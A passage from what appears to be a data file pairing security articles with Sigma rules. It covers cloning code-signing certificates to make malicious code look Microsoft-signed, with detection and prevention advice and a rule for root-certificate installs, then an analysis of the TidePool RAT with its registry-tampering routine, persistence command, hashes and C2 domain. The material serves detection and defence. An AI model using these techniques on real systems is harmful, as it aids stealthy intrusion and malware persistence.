cloned certificate chain passes all of these checks so any tool that performs signature validation (sigcheck, autoruns, procexp, AV?, etc.) will likely be fooled.\n\nYou may have noticed in the video, upon installation of the root certificate in the “CurrentUser” certificate store, a dialog popped up asking if you trust the certificate. If running in an elevated context, that popup will not occur. Why non-admin users are able to trust root CA certificates is beyond my comprehension. That should not be permitted in any organization.\n\n## Attack Weaponization\n\nThe video above showed a demo of how to create and trust a cloned root certificate locally. Ideally, in a real-world attack scenario, you wouldn’t clone a certificate chain and sign your malicious file on a compromised system. Rather, you would build the cloned chain and sign your malicious code on an attacker system. Now, the problem remains however of how you would realistically trust the cloned CA certificate on the victim system. You could probably get away with dropping it to disk and installing it but if you wanted to be a bit stealthier, as an admin, you could install and trust the certificate directly in the registry. The following is an example of how you could use WMI to remotely install and trust a cloned root CA certificate:\n\nIn this example, `$EncodedCertBlob` is just the contents of the exported cloned root CA .cer file base64-encoded. `$CertThumbprint` is the thumbprint value (i.e. SHA1 hash of the certificate). So, upon installation of that certificate, any code signed with a certificate from that CA will properly validate. In this particular case, the code will additionally give the appearance of being Microsoft-signed code.\n\n## Detecting Malicious Root CA Certificate Installation\n\nConsidering the root of this attack involves installation of a root CA certificate, this action will be the focus of building a detection. The installation of root CAs should be sufficiently uncommon such that a high-fidelity alert should be possible by monitoring the registry. Sysmon serves this purpose really well and what follows is an ideal config for catching root certificate installation:\n\nWhen an event fires, it would look like the following:\n\n```\nRegistry value set:\nEventType: SetValue\nUtcTime: 2017-12-20 17:12:11.999\nProcessGuid: {7ed59fb9-99eb-5a3a-0000-00102ab1af06}\nProcessId: 4404\nImage: C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\ROOT\\Certificates\\1F3D38F280635F275BE92B87CF83E40E40458400\\Blob\nDetails: Binary Data\n```\n\nUsing this rule set, you will likely get a lot of CreateKey event false positives. The high-fidelity events to pay attention to are SetValue events where the TargetObject property ends with “<THUMBPRINT_VALUE>\\Blob” as this indicates the direct installation or modification of a root certificate binary blob. Unfortunately, as of this writing, Sysmon configurations don’t allow sufficient granularity to constrain a set of registry events to a specific EventType nor are wildcards permitted in rule entries.\n\nSo the next question to ask yourself would be, “how do I know if this root certificate installation is ‘malicious’?” A logical first step would be to investigate the contents of the certificate to see if anything stands out. PowerShell makes inspecting certificates really easy.\n\n```\nGet-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | Format-List *\n```\n\nThe result of running this command might produce the following output:\n\n```\nPSPath                   : Microsoft.PowerShell.Security\\Certificate::LocalMachine\\Root\\1F3D38F280635F275BE92B87CF83E40E40458400\nPSParentPath             : Microsoft.PowerShell.Security\\Certificate::LocalMachine\\Root\nPSChildName              : 1F3D38F280635F275BE92B87CF83E40E40458400\nPSDrive                  : Cert\nPSProvider               : Microsoft.PowerShell.Security\\Certificate\nPSIsContainer            : False\nEnhancedKeyUsageList     : {}\nDnsNameList              : {Microsoft Root Certificate Authority 2010}\nSendAsTrustedIssuer      : False\nEnrollmentPolicyEndPoint : Microsoft.CertificateServices.Commands.EnrollmentEndPointProperty\nEnrollmentServerEndPoint : Microsoft.CertificateServices.Commands.EnrollmentEndPointProperty\nPolicyId                 :\nArchived                 : False\nExtensions               : {System.Security.Cryptography.Oid, System.Security.Cryptography.Oid, System.Security.Cryptography.Oid}\nFriendlyName             :\nIssuerName               : System.Security.Cryptography.X509Certificates.X500DistinguishedName\nNotAfter                 : 11/30/2042 9:06:37 PM\nNotBefore                : 12/1/2017 1:55:14 PM\nHasPrivateKey            : False\nPrivateKey               :\nPublicKey                : System.Security.Cryptography.X509Certificates.PublicKey\nRawData                  : {48, 130, 5, 219...}\nSerialNumber             : 52761736EEA4458142453E2D73FA89B2\nSubjectName              : System.Security.Cryptography.X509Certificates.X500DistinguishedName\nSignatureAlgorithm       : System.Security.Cryptography.Oid\nThumbprint               : 1F3D38F280635F275BE92B87CF83E40E40458400\nVersion                  : 3\nHandle                   : 1849876297952\nIssuer                   : CN=Microsoft Root Certificate Authority 2010, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\nSubject                  : CN=Microsoft Root Certificate Authority 2010, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n```\n\nTo any observer, this certificate definitely has the “look and feel” of a legitimate certificate but what is it exactly that makes a certificate “legitimate” or trusted? That process will be described in the last section of the post.\n\n## Preventing Malicious “CurrentUser” Root CA Certificate Installation\n\nIn the video demonstrating the root CA installation, it was performed in the current user context. While there may not be strong preventative mitigations for certificate installation as an admin, it is possible to prevent root certificate installation in the current user context by setting the following registry value:\n\n```\nHKLM\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\ProtectedRoots - Flags (REG_DWORD) - 1\n```\n\nWhile this registry key is not well documented online.aspx), wincrypt.h in the Windows SDK provides some contextual clues regarding the options available to set in the “Flags” value. The following relevant flag values are documented in the header file:\n\n```\n// Set the following flag to inhibit the opening of the CurrentUser's\n// .Default physical store when opening the CurrentUser's \"Root\" system store.\n// The .Default physical store open's the CurrentUser SystemRegistry \"Root\"\n// store.\n#define CERT_PROT_ROOT_DISABLE_CURRENT_USER_FLAG    0x1\n\n// Set the following flag to inhibit the adding of roots from the\n// CurrentUser SystemRegistry \"Root\" store to the protected root list\n// when the \"Root\" store is initially protected.\n#define CERT_PROT_ROOT_INHIBIT_ADD_AT_INIT_FLAG     0x2\n```\n\nAfter setting this key, you will get an access denied error when attempting to install a root CA to the CurrentUser Root certificate store.\n\nSo while not the most robust of preventative techniques, preventing non-admin users from trusting their own root CAs is certainly a strong policy to enforce in your organization.\n\nAs with any enforced preventative measure, an admin will need to consider “what might this break in my environment?” As with any preventative measure, it is important to roll them out in phases across an environment. If for whatever reason there is a business justification for permitting any user to trust a root certificate, you accept that an attacker or rogue software can trust arbitrary root certificates as well. Windows administrators will always have the ability to push trusted root certificates via Group Policy.aspx). A recent case where software installed its own root certificate without alerting the user was a Savitech audio driver. In this case, you would have needed to be admin to trust this root certificate but arbitrary root certificates have no basis for the establishment of trust compared to the arduous steps required to get your root certificate trusted by Microsoft.\n\n## Proper Validation of Root CA Trust\n\nUntil recently, I had actually never considered the way in which the trust of certificates could be validated until version 2.60 of sigcheck was released and the introduced the -v switch for use with -t or -tu:\n\n```\n-t[u][v]   Dump contents of specified certificate store ('*' for all stores). Specify -tu to query the user store (machine store is the default). Append '-v' to have Sigcheck download the trusted Microsoft root certificate list and only output valid certificates not rooted to a certificate on that list. If the site is not accessible, authrootstl.cab or authroot.stl in the current directory are used instead, if present.\n```\n\nHere is some example output:\n\n```\nsigcheck64.exe -tuv -nobanner\nUser\\Root:\n  Microsoft Root Certificate Authority 2010\n     Cert Status:    Valid\n     Valid Usage:    All\n     Cert Issuer:    Microsoft Root Certificate Authority 2010\n     Serial Number:  52 76 17 36 EE A4 45 81 42 45 3E 2D 73 FA 89 B2\n     Thumbprint:     1F3D38F280635F275BE92B87CF83E40E40458400\n     Algorithm:      sha256RSA\n     Valid from:     1:55 PM 12/1/2017\n     Valid to:       9:06 PM 11/30/2042\n```\n\nSo why should this entry not be trusted? What is Microsoft’s basis for trust? The answer to that is authroot.stl — a signed, ASN.1 encoded file consisting of the root certificates that Microsoft has deemed to be trustworthy. This is equivalent to the set of root CAs that come installed by default in the operating system. Occasionally, Microsoft may update this list though (whether through addition or revocation) and distribute updates via this link.\n\nWanting to understand the STL file format better and not necessarily wanting to rely upon sigcheck for performing root CA trust validation, I wrote a crude parser that extracts all of the trusted certificate thumbprint values so that I could perform similar validation in a PowerShell script. In the screenshot below, you will see the “malicious” cloned root CA certificate highlighted:\n\n*Image of the malicious cloned root CA certificate.*\n\n## Conclusion\n\nHopefully, by now you have a better appreciation of how attackers can appear to originate from the code signer of their choosing. This isn’t the only signing attack that would permit this, however. I’ve also published related research on how to hijack Subject Interface Packages that effectively allows you to apply legitimate digital signatures to malicious code that passes integrity validation checks.\n\nThe purpose of all of this research is twofold: to help encourage defenders and security vendors to challenge assumptions made in their investigative processes but to also educate on the importance of proper code signing validation for the purposes of determining whether any given signed code *actually* originates from who it claims to originate from.\n\nLastly, an astute reader will have noted that there may have been additional anomalies associated with the cloned certificate chain and signed code. I’ll leave discussion of these anomalies for another blog post. See you in 2018!",
    "sigma_rule": {
      "title": "New Root or CA or AuthRoot Certificate to Store",
      "id": "d223b46b-5621-4037-88fe-fda32eead684",
      "status": "test",
      "description": "Detects the addition of new root, CA or AuthRoot certificates to the Windows registry",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md#atomic-test-6---add-root-certificate-to-currentuser-certificate-store",
        "https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec"
      ],
      "author": "frack113",
      "date": "2022-04-04",
      "modified": "2023-08-17",
      "tags": [
        "attack.impact",
        "attack.t1490"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "\\SOFTWARE\\Microsoft\\SystemCertificates\\Root\\Certificates\\",
            "\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\SystemCertificates\\CA\\Certificates\\",
            "\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\CA\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\CA\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\",
            "\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\AuthRoot\\Certificates\\"
          ],
          "TargetObject|endswith": "\\Blob",
          "Details": "Binary Data"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_install_root_or_ca_certificat.yml",
    "id": "966"
  },
  {
    "url": "https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/",
    "markdown": "# Operation Ke3chang Resurfaces With New TidePool Malware\n\n**Published:** May 22, 2016\n\n## Introduction\n\nLittle has been published on the threat actors responsible for Operation Ke3chang since the report was released more than two years ago. However, Unit 42 has recently discovered the actors have continued to evolve their custom malware arsenal. We’ve discovered a new malware family we’ve named TidePool. It has strong behavioral ties to Ke3chang and is being used in an ongoing attack campaign against Indian embassy personnel worldwide. This targeting is also consistent with previous attacker TTPs; Ke3chang historically targeted the Ministry of Affairs, and also conducted several prior campaigns against India.\n\nThough we don’t have comprehensive targeting information, the spear phishing emails we found targeted several Indian embassies in different countries. One decoy references an annual report filed by over 30 Indian embassies across the globe. The sender addresses of the phishing emails spoof real people with ties to Indian embassies, adding legitimacy to the emails to prompt the recipients to open the attached file. Also noteworthy, the actors are exploiting a relatively new vulnerability in their attacks with TidePool, which is detailed below.\n\nIn this report we will highlight the reuse of the code responsible for a variety of registry changes and command and control traffic over time as the Ke3chang actor has evolved their codebase to TidePool since the 2013 report.\n\n## Exploitation of CVE-2015-2545\n\nThe weaponized document sent in phishing emails triggers the vulnerability outlined in CVE-2015-2545, which was first made public in September 2015. Unlike previously seen exploit carrier docs, this version comes packaged as an MHTML document which by default opens in Microsoft Word. We have seen multiple waves of activity with similar exploit docs, including those referenced in our recent Spivy blog. PwC recently released a great report analyzing the exploit documents themselves. The samples we are covering are documented in the \"Windows User_A\" section of their report (the malware they refer to as \"Danti Downloader\").\n\n## The TidePool Malware Family\n\nTidePool contains many capabilities common to most RATs. It allows the attacker to read, write and delete files and folders, and run commands over named pipes. TidePool gathers information about the victim's computer, base64 encodes the data, and sends it to the Command and Control (C2) server via HTTP, which matches capabilities of the BS2005 malware family used by the Ke3chang actor.\n\nThe TidePool malware is housed in an MHTML document which exploits CVE-2015-2545. The exploit code drops a DLL into\n\n*`C:\\Documents and Settings\\AllUsers\\IEHelper\\mshtml.dll`*\n\nThis dropped DLL is the TidePool sample. It also launches Internet Explorer as a subprocess of the svchost service. For persistence, TidePool utilizes an ActiveSetup key, which will launch itself on boot with the following parameters:\n\n*`rundll32.exe C:\\DOCUME~1\\ALLUSE~1\\IEHelper\\mshtml.dll,,IEHelper`*\n\nThe TidePool sample then sends victim computer information to the C2 server, as shown in Figure 1. Once a connection is made, the sample behaves as a RAT, receiving commands from the C2.\n\n**Figure 1.** The Base64 encoded data contains information about the victim’s service pack level, the current user, and the NETBIOS name of the victim system.\n\n## The Evolution From BS2005 to TidePool\n\nDuring our initial triage of the TidePool samples in AutoFocus, we noticed Windows Registry modifications that by themselves were not unique, but when viewed together were used by multiple malware families. One of these families is the \"BS2005\" malware family used by the Ke3chang actor. This motivated us to dig deeper, since we had not seen any public reporting on them since 2013. From this analysis, Unit 42 compared the code bases of the new malware family, and the BS2005 malware samples. Based on our analysis we believe this new malware, which we are calling TidePool, is an evolution of the BS2005 malware family used by the Ke3chang actor.\n\nUnit 42 has discovered 11 similar registry modifications that both TidePool and BS2005 employ. The registry setting that TidePool and BS2005 focuses on is:\n\n*`Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IEHarden -> 0`*\n\nWhen the IEHarden Value is set to 0 it disables the Internet Explorer Enhanced Security configuration, which is designed to prevent the execution of scripts, ActiveX Controls, file downloads, and the Microsoft virtual machine for HTML content. This is a technique common to both BS2005 and TidePool malware.\n\nBelow is the routine within TidePool that modifies the IEHarden registry settings. The repetition, order, and uniqueness of the code base in this function allowed us to link TidePool back to older versions of BS2005 and Operation Ke3chang.\n\n```image\nAlt: Figure 2. Routine to modify the IEHarden Value linking TidePool to BS2005.\nDescription: The image depicts a section of code that appears to be a function responsible for modifying the Windows Registry settings related to Internet Explorer. The code includes operations to set specific values for keys such as 'DisableFirstRunCustomize' and 'Check_Associations,' as well as the 'IEHarden' value under the ZoneMap settings. This function is part of the analysis linking the TidePool malware to the earlier BS2005 malware family, highlighting common registry modification behaviors used by both.\nTranscription: |\n  c\n  BOOL sub_10002D03()\n  {\n      int v0; // eax@1\n      HKEY phkResult; // [esp+14h] [ebp-10h]@1\n      LPLUSTR lpString1; // [esp+18h] [ebp-Ch]@1\n      BYTE Data[4]; // [esp+1Ch] [ebp-8h]@1\n      LPLUSTR lpString; // [esp+1Ch] [ebp-8h]@1\n      HKEY hKey; // [esp+20h] [ebp-4h]@1\n      *(DWORD *)Data = 1;\n      lpString1 = (LPLUSTR)VirtualAlloc(0, 0x200u, 0x1000u, 4u);\n      v3 = (LPLUSTR)VirtualAlloc(0, 0x200u, 0x1000u, 4u);\n      memset(lpString1, 0, 0x200u);\n      memset(v3, 0, 0x200u);\n      lstrcatW(lpString1, L\"Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\\");\n      lstrcatW(v3, L\"Software\\\\Microsoft\\\\Internet Connection Wizard\\\\\");\n      RegOpenKeyExHKEY_CURRENT_USER, lpString1, 0, 0xF003Fu, &phkResult);\n      RegSetValueEx(phkResult, L\"DisableFirstRunCustomize\", 0, 4u, Data, 4u);\n      v0 = lstrlenW(L\"no\");\n      RegSetValueEx(phkResult, L\"Check_Associations\", 0, 1u, (const BYTE *)L\"no\", 2 * v0);\n      RegCloseKey(phkResult);\n      RegCreateKeyEx(HKEY_CURRENT_USER, v3, 0, 0, &hKey, 0);\n      RegOpenKeyEx(HKEY_CURRENT_USER, v3, 0, 0xF003Fu, &phkResult);\n      RegSetValueEx(phkResult, L\"IEHarden\", 0, 4u, Data, 4u);\n      RegCloseKey(phkResult);\n      VirtualFree(lpString1, 0x200u, 0);\n      return VirtualFree(v3, 0x200u, 0);\n  }\n```\n\nCode reuse overlap also allowed us to link the various interim malware iterations between Ke3chang and TidePool together. Going over every single code overlap would be tiresome, so we'll highlight major functional similarities that allowed us to link TidePool to Operation Ke3chang. A listing of similar hashes and their compile dates can be found in the IOC section at the end of this blog. They are also divided into those that pre-date the Operation Ke3chang report and those that came after.\n\nWe compared 5 key samples that link TidePool to the original Operation Ke3chang malware. In order of comparison and usage we looked at:\n\n- BS2005 Operation Ke3chang sample\n  - `233bd004ad778b7fd816b80380c9c9bd2dba5b694863704ef37643255797b41f`\n- 2013 post Ke3chang\n  - `012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc`\n- 2014 post Ke3chang\n  - `04db80d8da9cd927e7ee8a44bfa3b4a5a126b15d431cbe64a508d4c2e407ec05`\n- 2014 post Ke3chang\n  - `eca724dd63cf7e98ff09094e05e4a79e9f8f2126af3a41ff5144929f8fede4b4`\n- 2015 Current TidePool\n  - `2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18`\n\nStarting with a known Operation Ke3chang BS2005 sample, we focus on the C2 obfuscation.\n\n```image\nAlt: Figure 3. Comparing a BS2005 and post Ke3chang sample C2 obfuscation routine.\nDescription: The image displays a code comparison between two subroutines in assembly language, specifically highlighting the differences in instructions and their flow. It consists of two sections side by side: the left side shows `sub_402C9B`, while the right side depicts `sub_402C47`. Both sections include details such as memory operations (e.g., `mov`, `add`, `xor`) and control flow instructions (e.g., `jle`, `j1`). The color-coded arrows indicate the flow between instructions, showing how they relate to one another, and assisting in understanding the similarities and differences in the code structure of the two subroutines.\nTranscription: |\n  00402C9B    sub_402C9B\n  00402CA3    mov     eax, eax\n  00402CA6    cmp     ss:[esp+arg_0], eax\n  00402CA9    jle     0x402CB7\n  \n  00402C9B    sub_402C9B\n  00402CA3    mov     b1, dl, b1[eax+ecx]\n  00402CA6    add     b1, dl, b1, 0x27\n  00402CAB    xor     b1, b1, dl\n  00402CAD    mov     b1, ds:[eax+ecx], b1\n  00402CB1    inc     b1\n  00402CB5    j1\n  \n  00402C9B    sub_402C9B\n  00402CA3    mov     eax, eax\n  00402CA6    cmp     ss:[esp+arg_0], eax\n  00402CA9    jle     0x402CB7\n  \n  00402C47    sub_402C47\n  00402C53    mov     b1, ds:[eax+ecx], b1\n  00402C56    add     b1, dl, b1, 0x5A\n  00402C58    xor     b1, b1, dl\n  00402C5B    mov     b1, ds:[eax+ecx], b1\n  00402C61    eax\n  00402C65    cmp     eax, ss:[esp+arg_4], eax\n  00402C67    j1\n  \n  00402C47    sub_402C47\n  00402C67    and     b1, ds:[eax+ecx], b1\n  00402C68    retn\n```\n\nNot only do BS2005 and TidePool share repeating registry behaviors, they also use a similar code routine to obfuscate the C2. Further analysis shows that they also share similar Base64 string handling. This routine goes back even further to MyWeb malware samples, also associated with Operation Ke3chang.\n\nNext we compared the codebase for setting registry keys. The code reuse displayed in Figure 4 is the sequence that sets the IEHarden registry keys and other keys used throughout TidePool and Operation Ke3chang malware.\n\n- `012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc`\n- `04db80d8da9cd927e7ee8a44bfa3b4a5a126b15d431cbe64a508d4c2e407ec05`\n\n```image\nAlt: Figure 4. Sequence that sets the IEHarden registry keys and other keys used in TidePool and Operation Ke3chang samples.\nDescription: The image displays two sets of code snippets side by side, presumably from a code analysis tool. Each snippet shows assembly code related to different subroutines, with specific instructions highlighted. The left side includes the subroutine labeled 'sub_40128D' while the right side features 'sub_1001590'. Lines of code are color-coded, indicating function calls and parameters being pushed onto the stack. There are arrows linking corresponding sections, suggesting comparisons or similarities between the two functions, which is relevant to the discussion of code reuse in the context of the TidePool malware's evolution from the BS2005 malware family.\nTranscription: |\n  00040128D  sub_40128D\n  00040128D  push    eax\n  00040128D  lea     eax, [esp+var_14]\n  00040128D  push    eax\n  00040128D  push    esi\n  00040128D  push    ecx\n  00040128D  push    edx\n  00040128D  call    sub_4012B0\n  00040128D  add     esp, 10h\n  00040128D  ret\n  \n  0040128D  sub_40128D\n  0040128D  push    eax\n  0040128D  lea     eax, [esp+var_10]\n  0040128D  push    eax\n  0040128D  push    esi\n  0040128D  push    ecx\n  0040128D  push    edx\n  0040128D  call    sub_4012B0\n  0040128D  add     esp, 10h\n  0040128D  ret\n  \n  00001990  sub_1001990\n  00001990  push    edx\n  00001990  lea     edx, [esp+var_14]\n  00001990  push    edx\n  00001990  push    esi\n  00001990  push    ecx\n  00001990  push    eax\n  00001990  call    sub_1001B90\n  00001990  add     esp, 10h\n  00001990  ret\n  \n  10001990  sub_1001990\n  10001990  push    edx\n  10001990  lea     edx, [esp+var_14]\n  10001990  push    edx\n  10001990  push    esi\n  10001990  push    ecx\n  10001990  push    eax\n  10001990  call    sub_1001B90\n  10001990  add     esp, 10h\n  10001990  ret\n```\n\nThe code that handles URL beacon creation is shown in Figure 5. These functions also displayed quite a bit of code reuse.\n\n- `eca724dd63cf7e98ff09094e05e4a79e9f8f2126af3a41ff5144929f8fede4b4`\n- `012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc`\n\n```image\nAlt: Figure 5. Comparing code blocks responsible for URL creation.\nDescription: The image displays a side-by-side comparison of two code routines, identified as `sub_4022CA` and `sub_4020E8`. Each section contains disassembled assembly code, highlighting similarities in function and structure. The image includes annotations and arrows pointing to specific lines of code, indicating areas of interest or significant similarity, which supports the analysis of code reuse between the TidePool and BS2005 malware. This technical detail is crucial for understanding the evolution of malware characteristics and behaviors.\nTranscription: |\n  04022CA  sub_4022CA\n  0402799  push   0x04E498      // as\n  04027A3  call   0x472058\n  04027AF  push   0x04E498      // aGoogle_0\n  04027B4  mov    eax, 0x472058\n  04027B8  call   0x420D51\n  04027BC  mov    eax, [esp+var_14], eax\n  04027C0  add    esp, 0x18\n  04027C4  mov    edx, 0x0400000\n  \n  04022CA  sub_4022CA\n  04027D7  mov    bl, ds: [ecx], b1 0\n  04027DB  inc    ecx\n  \n  04020E8  sub_4020E8\n  060C     push   0x04D0C8      // as\n  0611     push   0x470C04      // byte_470C04\n  0615     call   ebp\n  0618     call   0x04D0210\n  0622     push   eax            // pdvDataLen\n  0627     push   0x470C04\n  062B     call   0x420D25\n  0635     mov    eax, 0x0410084\n  063A     add    esp, 0x18\n  063E     mov    edx, 0x0400000\n  \n  04020E8  sub_4020E8\n  00402634  mov    bl, ds: [ecx], b1 0\n  00402647  inc    ecx\n```\n\nFinally, we compared the following two samples.\n\n- `04db80d8da9cd927e7ee8a44bfa3b4a5a126b15d431cbe64a508d4c2e407ec05`\n- `2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18`\n\nThese samples are quite similar when looking at the library functions used, but the most notable features they have in common are the timeline of behaviors executed. Ke3chang and TidePool both modify the IEHarden registry key, as well as the following list of keys. Setting these registry keys is unique to the Ke3chang and TidePool malware families.\n\n- `HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Check_Associations`\n- `HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\DisableFirstRunCustomize`\n- `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IEharden`\n\n## A Few Words On Attribution\n\nAttribution is an inexact process, however we have compiled several interesting findings which lend themselves to our conclusion that this activity and malware is related to the original Operation Ke3chang.\n\n- Strong behavioral overlap between the TidePool malware family and malware called BS2005 utilized by **Operation Ke3chang**\n- Strong code reuse and overlap showing a branching and evolution of malware from BS2005 to TidePool.\n- Targeting and attack method matches historic Ke3chang targeting.\n- When binaries included resources, encoding was 0x04 (LANG_CHINESE) indicating the actor’s system is likely running an operating system and software with Chinese as the default display language.\n\n## Conclusion\n\nDespite going unreported on since 2013, Operation Ke3chang has not ceased operations and in fact continued developing its malware. Unit 42 was able to track the evolution of Operation Ke3chang’s tools by observing unique behavioral quirks common throughout the malware’s lineage. By pivoting on these behaviors in AutoFocus, we were able to assess a relationship between these families dating back to at least 2012 and the creation of TidePool, a new malware family continuing in Ke3chang’s custom malware footsteps. While we can’t know all of the groups’ attacks using TidePool or older malware, we have uncovered its use against Indian Embassies, which was also documented in the 2013 report, indicating this is likely a high priority target as it has continued over multiple years.\n\nCustomers can utilize the Ke3changResurfaces AutoFocus tag to examine the samples discussed in this post. IPS coverage for TidePool is provided by TID 14588.\n\n## TidePool IOCs\n\n**Phishing emails:**\n\n- `4d5e0eddcd014c63123f6a46af7e53b5ac25a7ff7de86f56277fe39bff32c7b5`\n- `1896d190ed5c5d04d74f8c2bfe70434f472b43441be824e81a31b7257b717e51`\n- `de5060b7e9aaaeb8d24153fe35b77c27c95dadda5a5e727d99f407c8703db649`\n\n**Weaponized document attachments:**\n\n- `785e8a39eb66e872ff5abee48b7226e99bed2e12bc0f68fc430145a00fe523db`\n- `eea3f90db41f872da8ed542b37948656b1fb93b12a266e8de82c6c668e60e9fc`\n\n**TidePool Dropper:**\n\n- `38f2c86041e0446730479cdb9c530298c0c4936722975c4e7446544fd6dcac9f`\n\n**TidePool dlls:**\n\n- `67c4e8ab0f12fae7b4aeb66f7e59e286bd98d3a77e5a291e8d58b3cfbc1514ed`\n- `2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18`\n- `9d0a47bdf00f7bd332ddd4cf8d95dd11ebbb945dda3d72aac512512b48ad93ba`\n\n**C2 domain:**\n\n- `goback.strangled[.]net`\n\n## TidePool sample groupings\n\n**Group 1: 3/1/2012 - 3/22/2012**\n\n- `71b548e09fd51250356111f394e5fc64ac54d5a07d9bc57852315484c2046093` (BS2005)\n- `39fdcdf019c0fca350ec5bd3de31b6649456993b3f9642f966d610e0190f9297` (BS2005)\n- `bfa5d062bfc1739e1fcfacefd3a1f95b40104c91201efc618804b6eb9e30c018`\n- `4e38848fabd0cb99a8b161f7f4972c080ce5990016212330d7bfbe08ab49526a`\n- `d097a1d5f86b3a9585cca42a7785b0ff0d50cd1b61a56c811d854f5f02909a5d`\n- `25a3b374894cacd922e7ff870bb19c84a9abfd69405dded13c3a6ceb5abe4d27`\n\n**Group 2: 6/1/2012 - 7/10/2012**\n\n- `12cc0fdc4f80942f0ba9039a22e701838332435883fa62d0cefd3992867a9e88` (BS2005)\n- `a4fae981b687fe230364508a3324cf6e6daa45ecddd6b7c7b532cdc980679076` (BS2005)\n- `c1a83a9600d69c91c19207a8ee16347202d50873b6dc4613ba4d6a6059610fa1`\n\n**Group 3: 8/28/2012 - 11/19/2012**\n\n- `023e8f5922b7b0fcfe86f9196ae82a2abbc6f047c505733c4b0a732caf30e966` (BS2005)\n- `064051e462990b0a530b7bbd5e46b68904a264caee9d825e54245d8c854e7a8a` (BS2005)\n- `07aa6f24cec12b3780ebaba2ca756498e3110243ca82dca018b02bd099da36bb` (BS2005)\n- `cdb8a15ededa8b4dee4e9b04a00b10bf4b6504b9a05a25ecae0b0aca8df01ff9` (BS2005)\n- `f84a847c0086c92d7f90249be07bbf2602fe97488e2fef8d3e7285384c41b54e` (BS2005)\n- `89ccea68f76afa99d4b5d00d35b6d2f229c4af914fbb2763e37f5f87dcf2f7bf`\n- `be378ad63b61b03bdc6fd3ef3b81d3c2d189602a24a960118e074d7aff26c7bd`\n- `c5d274418532231a0a225fc1a659dd034f38fde051840f8ed39e0b960d84c056`\n\n**Group 4: 4/18/2013 - 11/5/2013**\n\n- `233bd004ad778b7fd816b80380c9c9bd2dba5b694863704ef37643255797b41f` (BS2005)\n- `3795fd3e1fe4eb8a56d611d65797e3947acb209ddb2b65551bf067d8e1fa1945` (BS2005)\n- `6d744f8a79e0e937899dbc90b933226e814fa226695a7f0953e26a5b65838c89` (BS2005)\n- `b344b9362ac274ca3547810c178911881ccb44b81847071fa842ffc8edfcd6ec` (BS2005)\n- `e72c5703391d4b23fcd6e1d4b8fd18fe2a6d74d05638f1c27d70659fbf2dcc58` (BS2005)\n- `690c4f474553a5da5b90fb43eab5db24f1f2086e6d6fd75105b54e616c490f3f`\n- `d64cd5b4caf36d00b255fdaccb542b33b3a7d12aef9939e35fdb1c5f06c2d69c`\n- `0ec913017c0adc255f451e8f38956cfc1877e1c3830e528b0eb38964e7dd00ff`\n\n**Post Fireye's Ke3chang blog**\n\n**Group 5: 5/2/2013 - 10/23/2013**\n\n- `012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc`\n- `0f88602a11963818b73a52f00a4f670a0bf5111b49549aa13682b66dd9895155`\n- `2a454d9577d75ac76f5acf0082a6dca37be41f7c74e0a4dbd41d8a9a75120f5c`\n- `66d9001b6107e16cdb4275672e8dd21b3263481a56f461428909a7c265c67851`\n- `863ee162a18d429664443ce5c88a21fd629e22ad739191c7c6a9237f64cdd2f3`\n- `8b3ef6112f833d6d232864cf66b57a0f513e0663ee118f8d33d93ad8651af330`\n- `904e31e4ab030cba00b06216c81252f6ee189a2d044eca19d2c0dc41508512f3`\n\n**Group 6: 03/09/2014**\n\n- `F3c39376aa93b6d17903f1f3d6a557eb91a977dae19b4358ef57e686cd52cc03`\n- `7c17ccdd8eba3791773de8bc05ab4854421bc3f2554c7ded00065c10698300fe`\n\n**Group 7: 08/26/2014**\n\n- `eca724dd63cf7e98ff09094e05e4a79e9f8f2126af3a41ff5144929f8fede4b4`\n\n**Group 8: 04/09/2014**\n\n- `04db80d8da9cd927e7ee8a44bfa3b4a5a126b15d431cbe64a508d4c2e407ec05`\n\n**Group 9: 3/11/2015**\n\n- `6eb3528436c8005cfba21e88f498f7f9e3cf40540d774ab1819cddf352c5823d`\n\n**Group 10: 08/04/2015**\n\n- `6bcf242371315a895298dbe1cdec73805b463c13f9ce8556138fa4fa0a3ad242`\n\n**Group 11: 12/28/2015**\n\n- 